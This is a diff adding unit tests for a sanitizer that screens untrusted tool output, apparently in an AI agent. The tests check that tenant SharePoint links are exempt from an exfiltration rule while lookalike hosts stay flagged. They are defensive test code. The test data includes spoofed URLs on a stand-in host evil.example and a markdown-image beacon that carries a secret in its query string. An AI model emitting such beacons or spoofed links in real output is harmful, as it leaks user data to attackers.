@@ -788,3 +788,76 @@ describe('applyScreenVerdict', () => {
     expect(inner.startsWith(FENCE.open)).toBe(true)
   })
 })
+
+// ============================================================================
+// sourceLinks — the tenant's own document links (#784 item 6)
+// ============================================================================
+
+describe("sourceLinks: a Graph result's own webUrl on a configured host", () => {
+  const links = {
+    namespace: 'graph',
+    field: 'webUrl',
+    hosts: ['contoso.sharepoint.com', 'contoso-my.sharepoint.com'],
+  }
+  const graph = { tool: 'graph_files_recent', namespace: 'graph' }
+  // No percent-encoding, so the `/`-joined path is one 64+ run of the rule's class.
+  const PATH =
+    '/personal/first_last_contoso_com/Documents/Project_Planning/Quarterly-Reviews/Report.docx'
+  const LINK = `https://contoso-my.sharepoint.com${PATH}`
+  const rulesOf = (data: unknown, c = graph, o: object = { sourceLinks: links }) =>
+    sanitizeUntrusted(data, c, o).report.findings.map((f) => f.rule)
+
+  it('the link trips exfil-data-url when no exemption is declared (the false positive)', () => {
+    expect(rulesOf({ webUrl: LINK }, graph, {})).toEqual(['exfil-data-url'])
+  })
+
+  // MUTATION: sanitize every leaf with `rules` (ignore isSourceLink): red.
+  it('is not flagged, and the result comes back by reference', () => {
+    const data = { files: [{ name: 'Report.docx', webUrl: LINK }] }
+    const out = sanitizeUntrusted(data, graph, { sourceLinks: links })
+    expect(out.report.findings).toEqual([])
+    expect(out.data).toBe(data)
+  })
+
+  // MUTATION: drop the namespace check: the web case goes red. Drop the key
+  // check: the other-field, bare-string and array cases go red.
+  it.each([
+    ['in web content, under the same options', { webUrl: LINK }, ctx],
+    ['in another field of the Graph result', { preview: LINK }, graph],
+    ['as a bare string from the Graph tool', LINK, graph],
+    ['in an array under webUrl', { webUrl: [LINK] }, graph],
+    ['inside prose in the webUrl field', { webUrl: `see ${LINK}` }, graph],
+  ])('the same link is still flagged %s', (_label, data, c) => {
+    expect(rulesOf(data, c)).toContain('exfil-data-url')
+  })
+
+  // MUTATION: `url.hostname.endsWith(host)` instead of equality: the subdomain
+  // case goes red; `value.includes(host)`: the suffix and userinfo cases too.
+  // Drop the credentials/port check: the port and reversed-userinfo cases.
+  // Drop SINGLE_HTTPS_URL: the http and second-shape cases.
+  it.each([
+    ['suffix', `https://contoso-my.sharepoint.com.evil.example${PATH}`],
+    ['prefix', `https://evilcontoso-my.sharepoint.com${PATH}`],
+    ['subdomain', `https://x.contoso-my.sharepoint.com${PATH}`],
+    ['userinfo', `https://contoso-my.sharepoint.com@evil.example${PATH}`],
+    ['reversed userinfo', `https://evil.example@contoso-my.sharepoint.com${PATH}`],
+    ['port', `https://contoso-my.sharepoint.com:8443${PATH}`],
+    ['plain http', `http://contoso-my.sharepoint.com${PATH}`],
+    ['a second shape after it', `${LINK} ![x](https://evil.example/p.png?d=SECRET)`],
+  ])('a lookalike is still flagged: %s', (_label, url) => {
+    expect(rulesOf({ webUrl: url })).toContain('exfil-data-url')
+  })
+
+  // MUTATION: exempt the link from every rule (`linkRules = []`): red.
+  it('an exempt-shaped link still meets every other rule', () => {
+    expect(rulesOf({ webUrl: `${LINK}\u200B` })).toEqual(['hidden-invisible'])
+    expect(rulesOf({ webUrl: `${LINK}⟦x⟧` })).toEqual(['sentinel-escape'])
+  })
+
+  it.each([
+    ...CORPUS.map(({ name, text }) => [name, text] as const),
+    ['a data: URL', `data:text/html;base64,${'QUFB'.repeat(30)}`] as const,
+  ])('every other shape in the webUrl field is unchanged: %s', (_name, text) => {
+    expect(rulesOf({ webUrl: text })).toEqual(rulesOf({ webUrl: text }, graph, {}))
+  })
+})
